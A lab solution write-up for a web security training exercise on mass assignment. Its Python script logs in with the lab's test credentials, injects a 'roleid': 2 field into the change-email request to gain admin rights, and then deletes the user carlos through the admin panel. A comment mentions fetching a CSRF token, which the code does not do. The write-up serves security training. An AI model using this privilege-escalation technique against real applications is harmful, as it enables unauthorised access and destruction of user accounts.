# User role can be modified in user profile

> This lab has an admin panel at `/admin`. It's only accessible to logged-in users with a `roleid` of 2.
> Solve the lab by accessing the admin panel and using it to delete the user `carlos`.
> You can log in to your own account using the following credentials: `wiener:peter`


```python
import requests
import sys
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0ae5006904d8f25f805c99c6007600ae.web-security-academy.net/"

def exploit_mass_assignment(url):
    session = requests.Session()
    
    # 1. Login Phase
    # We must fetch the login page first to get the CSRF token (standard PortSwigger protection)
    login_url = f"{url}login"
    print(f"[*] Navigating to login: {login_url}")
    
    login_creds = {
        "username": "wiener",
        "password": "peter",
      
    }
    
    print("[*] Logging in...")
    login_resp = session.post(login_url, data=login_creds)
    
    if "Log out" not in login_resp.text:
        print("[-] Login failed.")
        return

    print("[+] Login Successful.")

    # 2. Exploitation Phase
    # The vulnerability is in the email change endpoint which accepts JSON
    api_endpoint = f"{url}my-account/change-email"
    
    # Payload: Inject 'roleid': 2 to escalate privileges
    exploit_payload = {
        "email": "pwned@admin.net",
        "roleid": 2
    }
    
    print(f"[*] Sending Mass Assignment payload to: {api_endpoint}")
    # Using json parameter automatically sets Content-Type: application/json
    response = session.post(api_endpoint, json=exploit_payload)
    
    # 3. Verification & Action Phase
    # Check if we can access the admin panel
    admin_path = f"{url}admin"
    delete_path = f"{admin_path}/delete?username=carlos"
    
    print(f"[*] Attempting to access admin panel...")
    admin_resp = session.get(admin_path)
    
    if admin_resp.status_code == 200:
        print("[+] Admin Privileges Confirmed.")
        print(f"[*] Deleting user 'carlos'...")
        
        del_resp = session.get(delete_path)
        
        if del_resp.status_code == 200:
            print("[+] SUCCESS: User 'carlos' deleted.")
        else:
            print(f"[-] Failed to delete user. Status: {del_resp.status_code}")
    else:
        print(f"[-] Privilege escalation failed. Status: {admin_resp.status_code}")

if __name__ == "__main__":
    exploit_mass_assignment(BASE_URL)
```